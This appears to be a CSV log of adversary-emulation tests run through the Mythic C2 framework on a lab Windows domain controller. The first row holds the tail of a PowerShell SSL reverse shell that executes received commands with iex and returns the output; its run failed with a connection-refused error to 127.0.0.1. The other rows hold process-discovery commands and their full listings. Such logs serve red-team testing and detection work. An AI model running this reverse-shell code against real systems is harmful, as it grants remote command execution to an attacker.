command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
",2024-09-05T18:11:55.591986,success,mythic,OpenSSL C2,21caf58e-87ad-440c-a6b8-3ac259964003,"Thanks to @OrOneEqualsOne for this quick C2 method.
This is to test to see if a C2 session can be established using an SSL socket.
More information about this technique, including how to set up the listener, can be found here:
https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
",['windows'],powershell,300,15,"ERROR: New-Object : Exception calling "".ctor"" with ""2"" argument(s): ""No connection could be made because 
ERROR: the target machine actively refused it 127.0.0.1:443""
ERROR: At line:5 char:11
ERROR: + $socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')
ERROR: +           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
ERROR:    jectCommand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:6 char:1
ERROR: + $stream = $socket.GetStream()
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: New-Object : Exception calling "".ctor"" with ""3"" argument(s): ""Value cannot be null.
ERROR: Parameter name: innerStream""
ERROR: At line:7 char:14
ERROR: + ... sslStream = New-Object System.Net.Security.SslStream($stream,$false,( ...
ERROR: +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
ERROR:    jectCommand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:8 char:1
ERROR: + $sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: new-object : A constructor was not found. Cannot find an appropriate constructor for type 
ERROR: System.IO.StreamWriter.
ERROR: At line:9 char:11
ERROR: + $writer = new-object System.IO.StreamWriter($sslStream)
ERROR: +           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (:) [New-Object], PSArgumentException
ERROR:     + FullyQualifiedErrorId : CannotFindAppropriateCtor,Microsoft.PowerShell.Commands.NewObjectCom 
ERROR:    mand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:10 char:1
ERROR: + $writer.Write('PS ' + (pwd).Path + '> ')
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:11 char:1
ERROR: + $writer.flush()
ERROR: + ~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:13 char:8
ERROR: + while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
ERROR: +        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
"
"tasklist
",2024-09-05T18:12:32.077452,success,mythic,Process Discovery - tasklist,c5806a4f-62b8-4900-980b-c7ec004e9908,"Utilize tasklist to identify processes.

Upon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. 
",['windows'],shell,300,15,"
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        140 K
Registry                       124 Services                   0     19,668 K
smss.exe                       348 Services                   0      1,264 K
csrss.exe                      464 Services                   0      6,132 K
csrss.exe                      536 RDP-Tcp#0                  1      6,252 K
winlogon.exe                   588 RDP-Tcp#0                  1     11,296 K
wininit.exe                    596 Services                   0      6,920 K
services.exe                   676 Services                   0      9,568 K
lsass.exe                      684 Services                   0     69,208 K
svchost.exe                    908 Services                   0     22,688 K
fontdrvhost.exe                956 RDP-Tcp#0                  1      5,676 K
fontdrvhost.exe                964 Services                   0      4,032 K
svchost.exe                      8 Services                   0     11,584 K
svchost.exe                    448 Services                   0     10,940 K
dwm.exe                        920 RDP-Tcp#0                  1     71,912 K
svchost.exe                   1064 Services                   0     65,844 K
svchost.exe                   1108 Services                   0      9,988 K
svchost.exe                   1252 Services                   0      5,460 K
svchost.exe                   1260 Services                   0     21,544 K
svchost.exe                   1268 Services                   0      7,220 K
svchost.exe                   1276 Services                   0      7,812 K
svchost.exe                   1284 Services                   0     12,176 K
svchost.exe                   1388 Services                   0      7,196 K
svchost.exe                   1432 Services                   0      9,128 K
svchost.exe                   1540 Services                   0     19,208 K
svchost.exe                   1572 Services                   0     13,348 K
svchost.exe                   1580 Services                   0     11,484 K
svchost.exe                   1588 Services                   0      5,944 K
svchost.exe                   1596 Services                   0      8,064 K
svchost.exe                   1732 Services                   0      6,172 K
svchost.exe                   1740 Services                   0     11,448 K
svchost.exe                   1792 Services                   0      8,612 K
svchost.exe                   1852 Services                   0      8,996 K
svchost.exe                   1880 Services                   0     12,900 K
svchost.exe                   1904 Services                   0     15,556 K
svchost.exe                   1936 Services                   0      6,988 K
svchost.exe                   1972 Services                   0      9,524 K
svchost.exe                   2064 Services                   0      8,136 K
svchost.exe                   2100 Services                   0     10,836 K
svchost.exe                   2172 Services                   0      7,704 K
svchost.exe                   2280 Services                   0      7,496 K
svchost.exe                   2304 Services                   0      9,968 K
svchost.exe                   2444 Services                   0     10,496 K
svchost.exe                   2552 Services                   0      9,144 K
svchost.exe                   2892 Services                   0      7,212 K
svchost.exe                   2992 Services                   0      7,432 K
svchost.exe                   3016 Services                   0      8,924 K
spoolsv.exe                   1456 Services                   0     17,012 K
svchost.exe                   3076 Services                   0     13,632 K
svchost.exe                   3120 Services                   0     14,248 K
svchost.exe                   3128 Services                   0     18,576 K
svchost.exe                   3136 Services                   0      6,768 K
svchost.exe                   3144 Services                   0     10,700 K
svchost.exe                   3164 Services                   0     28,168 K
svchost.exe                   3172 Services                   0      7,176 K
svchost.exe                   3184 Services                   0     11,888 K
ismserv.exe                   3260 Services                   0      6,256 K
MsMpEng.exe                   3300 Services                   0     98,672 K
wlms.exe                      3324 Services                   0      3,584 K
Microsoft.ActiveDirectory     3336 Services                   0     46,816 K
dfsrs.exe                     3352 Services                   0     23,020 K
qemu-ga.exe                   3396 Services                   0      9,704 K
blnsvr.exe                    3404 Services                   0      8,112 K
dns.exe                       3424 Services                   0    125,916 K
dfssvc.exe                    3488 Services                   0      8,388 K
svchost.exe                   3572 Services                   0     13,176 K
AggregatorHost.exe            4236 Services                   0      4,692 K
vds.exe                       4348 Services                   0     11,456 K
svchost.exe                   5100 Services                   0     11,628 K
WmiPrvSE.exe                  4680 Services                   0     13,348 K
svchost.exe                   4148 RDP-Tcp#0                  1     13,168 K
svchost.exe                   2976 RDP-Tcp#0                  1     28,760 K
taskhostw.exe                 3208 RDP-Tcp#0                  1     12,384 K
sihost.exe                    5124 RDP-Tcp#0                  1     26,624 K
MicrosoftEdgeUpdate.exe       5184 Services                   0      4,060 K
svchost.exe                   5200 Services                   0      7,508 K
ctfmon.exe                    5280 RDP-Tcp#0                  1     15,388 K
svchost.exe                   5332 Services                   0     12,272 K
svchost.exe                   5484 Services                   0     10,844 K
svchost.exe                   5556 Services                   0     13,360 K
explorer.exe                  5700 RDP-Tcp#0                  1    134,868 K
TextInputHost.exe             6052 RDP-Tcp#0                  1     43,472 K
StartMenuExperienceHost.e     6072 RDP-Tcp#0                  1     55,976 K
RuntimeBroker.exe             4912 RDP-Tcp#0                  1     16,188 K
SearchApp.exe                 3972 RDP-Tcp#0                  1     57,848 K
RuntimeBroker.exe             1468 RDP-Tcp#0                  1     20,852 K
RuntimeBroker.exe             2668 RDP-Tcp#0                  1     13,896 K
powershell.exe                4612 RDP-Tcp#0                  1     74,528 K
conhost.exe                   4560 RDP-Tcp#0                  1     23,052 K
taskhostw.exe                 5096 RDP-Tcp#0                  1     11,408 K
svchost.exe                   2312 Services                   0     17,100 K
msdtc.exe                     3456 Services                   0     10,564 K
svchost.exe                   3412 Services                   0     11,612 K
svchost.exe                   5680 Services                   0     14,248 K
svchost.exe                   1832 Services                   0     11,956 K
svchost.exe                   2956 RDP-Tcp#0                  1     16,944 K
csrss.exe                     3500 Console                    2      6,012 K
winlogon.exe                  2372 Console                    2      8,420 K
LogonUI.exe                   2788 Console                    2     44,796 K
dwm.exe                       4344 Console                    2     43,352 K
fontdrvhost.exe               4992 Console                    2      4,088 K
rdpclip.exe                   4408 RDP-Tcp#0                  1     11,328 K
WUDFHost.exe                  5308 Services                   0     36,860 K
apollo.exe                    4580 RDP-Tcp#0                  1    133,776 K
conhost.exe                   4208 RDP-Tcp#0                  1     18,328 K
cmd.exe                       1216 RDP-Tcp#0                  1      3,936 K
conhost.exe                   5176 RDP-Tcp#0                  1     15,024 K
tasklist.exe                  4468 RDP-Tcp#0                  1      8,832 K
"
"Get-Process
",2024-09-05T18:12:43.089979,success,mythic,Process Discovery - Get-Process,3b3809b6-a54b-4f5b-8aff-cb51f2e97b34,"Utilize Get-Process PowerShell cmdlet to identify processes.

Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
",['windows'],powershell,300,15,"
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                              
-------  ------    -----      -----     ------     --  -- -----------                              
     88       6      880       4692       0.02   4236   0 AggregatorHost                           
   1322      55   118972     139536       9.22   4580   1 apollo                                   
    150      10     1576       8112       0.02   3404   0 blnsvr                                   
    176      12     6900      18328       0.14   4208   1 conhost                                  
    174      12     4932      23052       0.25   4560   1 conhost                                  
    443      20     1912       6132       0.30    464   0 csrss                                    
    306      14     1924       6252       0.42    536   1 csrss                                    
    162      11     1704       6012       0.08   3500   2 csrss                                    
    383      15     3364      15388       0.41   5280   1 ctfmon                                   
    406      34    15888      23020       0.48   3352   0 dfsrs                                    
    195      13     2304       8388       0.05   3488   0 dfssvc                                   
   5394    6211   128720     125876       0.34   3424   0 dns                                      
    805      32    15680      71940       2.31    920   1 dwm                                      
    716      27    17468      43352       0.19   4344   2 dwm                                      
   2004      88    37556     125692      11.64   5700   1 explorer                                 
     33       7     1840       5676       0.08    956   1 fontdrvhost                              
     33       6     1316       4032       0.00    964   0 fontdrvhost                              
     33       6     1252       4088       0.06   4992   2 fontdrvhost                              
      0       0       60          8                 0   0 Idle                                     
    155      13     2052       6240       0.05   3260   0 ismserv                                  
    454      26     9772      44796       0.19   2788   2 LogonUI                                  
   1880     193    64760      69272       3.16    684   0 lsass                                    
    596      36    37500      46772       0.47   3336   0 Microsoft.ActiveDirectory.WebServices    
    215      14     1908       4060       0.16   5184   0 MicrosoftEdgeUpdate                      
    233      14     2764      10564       0.03   3456   0 msdtc                                    
    592     191   211984      98668      26.47   3300   0 MsMpEng                                  
    793      31    61956      74536       0.86   4612   1 powershell                               
    174      11     2200       9704       0.11   3396   0 qemu-ga                                  
    316      12     2392      11328       0.45   4408   1 rdpclip                                  
      0      13    12244      19664       2.47    124   0 Registry                                 
    284      15     4912      20852       0.27   1468   1 RuntimeBroker                            
    231      13     2588      13896       0.16   2668   1 RuntimeBroker                            
    188      12     2596      16188       0.06   4912   1 RuntimeBroker                            
    633      31    29760      57848       0.95   3972   1 SearchApp                                
    558      12     4556       9564       0.97    676   0 services                                 
    496      17     4936      26640       0.41   5124   1 sihost                                   
     60       3     1076       1264       0.23    348   0 smss                                     
    458      22     5524      17012       0.13   1456   0 spoolsv                                  
    579      27    13612      55976       0.61   6072   1 StartMenuExperienceHost                  
    899      20     4904      11600       1.06      8   0 svchost                                  
    341      13     2736      10980       0.09    448   0 svchost                                  
    995      20     6556      22688       0.45    908   0 svchost                                  
    883      30    63324      65964       1.45   1064   0 svchost                                  
    210      12     1988       9988       0.09   1108   0 svchost                                  
    108       8     1220       5460       0.02   1252   0 svchost                                  
    368      14    16768      21544       0.80   1260   0 svchost                                  
    119      14     2924       7220       0.03   1268   0 svchost                                  
    216      13     1700       7812       0.06   1276   0 svchost                                  
    183      10     1652      12176       0.09   1284   0 svchost                                  
    211      10     1896       7196       0.06   1388   0 svchost                                  
    270      14     2860       9100       0.14   1432   0 svchost                                  
    412      32     9524      19208       0.41   1540   0 svchost                                  
    291      17     3024      13348       0.13   1572   0 svchost                                  
    204      11     2220      11484       0.06   1580   0 svchost                                  
    158       8     1260       5944       0.00   1588   0 svchost                                  
    170      10     1880       8064       0.08   1596   0 svchost                                  
    147       7     1376       6172       0.05   1732   0 svchost                                  
    370      14     3688      11448       0.08   1740   0 svchost                                  
    175      11     1896       8612       0.06   1792   0 svchost                                  
    224      14     2644      11956       0.09   1832   0 svchost                                  
    284      12     1908       8996       0.06   1852   0 svchost                                  
    189      12     2140      12900       0.02   1880   0 svchost                                  
    395      18     4864      15536       0.31   1904   0 svchost                                  
    151      10     1632       6988       0.03   1936   0 svchost                                  
    215      13     2172       9524       0.05   1972   0 svchost                                  
    175      10     1676       8136       0.03   2064   0 svchost                                  
    431      14     2828      10836       0.20   2100   0 svchost                                  
    168      10     1880       7704       0.06   2172   0 svchost                                  
    176      10     1652       7496       0.02   2280   0 svchost                                  
    233      16     2228       9968       0.05   2304   0 svchost                                  
    288      16    10576      16880       1.52   2312   0 svchost                                  
    363      15     2636      10496       0.06   2444   0 svchost                                  
    203      10     2316       9144       0.16   2552   0 svchost                                  
    119       8     1328       7212       0.03   2892   0 svchost                                  
    222      12     2768      16992       0.06   2956   1 svchost                                  
    329      17     6036      28760       0.28   2976   1 svchost                                  
    162      11     1752       7432       0.02   2992   0 svchost                                  
    207      11     2240       8924       0.16   3016   0 svchost                                  
    267      27     3516      13620       0.20   3076   0 svchost                                  
    162       9     5764      14248       0.77   3120   0 svchost                                  
    436      16     8416      18296       0.53   3128   0 svchost                                  
    133       9     1476       6768       0.00   3136   0 svchost                                  
    213      12     2452      10684       0.08   3144   0 svchost                                  
    509      22    13216      28168       1.00   3164   0 svchost                                  
    146      42     1632       7176       0.00   3172   0 svchost                                  
    135       9     1496      11888       0.05   3184   0 svchost                                  
    266      13     3908      11612       0.02   3412   0 svchost                                  
    388      24     3428      13176       0.11   3572   0 svchost                                  
    236      13     2984      13168       0.08   4148   1 svchost                                  
    208      11     2424      11628       0.11   5100   0 svchost                                  
    170      10     1504       7508       0.02   5200   0 svchost                                  
    200      12     2644      12268       0.11   5332   0 svchost                                  
    158      10     1940      10816       0.14   5484   0 svchost                                  
    237      14     2568      13360       0.05   5556   0 svchost                                  
    259      20     7896      14248       0.17   5680   0 svchost                                  
   2270       0       36        140      10.30      4   0 System                                   
    194      19     3280      12384       0.09   3208   1 taskhostw                                
    169      11     2060      11408       0.06   5096   1 taskhostw                                
    531      23    10604      43472       0.56   6052   1 TextInputHost                            
    206      16     2416      11456       0.13   4348   0 vds                                      
    156      11     1336       6920       0.14    596   0 wininit                                  
    245      12     2360      11296       0.13    588   1 winlogon                                 
    203      10     1968       8420       0.06   2372   2 winlogon                                 
     58       5      724       3584       0.03   3324   0 wlms                                     
    300      14     5616      13608       0.25   4680   0 WmiPrvSE                                 
    325      13     3292      36860       0.14   5308   0 WUDFHost                                 


"
"get-wmiObject -class Win32_Process
",2024-09-05T18:12:52.640008,success,mythic,Process Discovery - get-wmiObject,b51239b4-0129-474f-a2b4-70f855b9f2c2,"Utilize get-wmiObject PowerShell cmdlet to identify processes.

Upon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. 
",['windows'],powershell,300,15,"

__GENUS                    : 2
__CLASS                    : Win32_Process
__SUPERCLASS               : CIM_Process
__DYNASTY                  : CIM_ManagedSystemElement
__RELPATH                  : Win32_Process.Handle=""0""
__PROPERTY_COUNT           : 45
__DERIVATION               : {CIM_Process, CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER                   : GORILLA-DC01-20
__NAMESPACE                : root\cimv2
__PATH                     : \\GORILLA-DC01-20\root\cimv2:Win32_Process.Handle=""0""
Caption                    : System Idle Process
CommandLine                : 
CreationClassName          : Win32_Process
CreationDate               : 20240905134654.544742-240
CSCreationClassName        : Win32_ComputerSystem
CSName                     : GORILLA-DC01-20
Description                : System Idle Process
ExecutablePath             : 
ExecutionState             : 
Handle                     : 0
HandleCount                : 0
InstallDate                : 
KernelModeTime             : 61223750000
MaximumWorkingSetSize      : 
MinimumWorkingSetSize      : 
Name                       : System Idle Process
OSCreationClassName        : Win32_OperatingSystem
OSName                     : Microsoft Windows Server 2022 Standard 
                             Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount        : 0
OtherTransferCount         : 0
PageFaults                 : 9
PageFileUsage              : 60
ParentProcessId            : 0
PeakPageFileUsage          : 60
PeakVirtualSize            : 8192
PeakWorkingSetSize         : 8
Priority                   : 0
PrivatePageCount           : 61440
ProcessId                  : 0
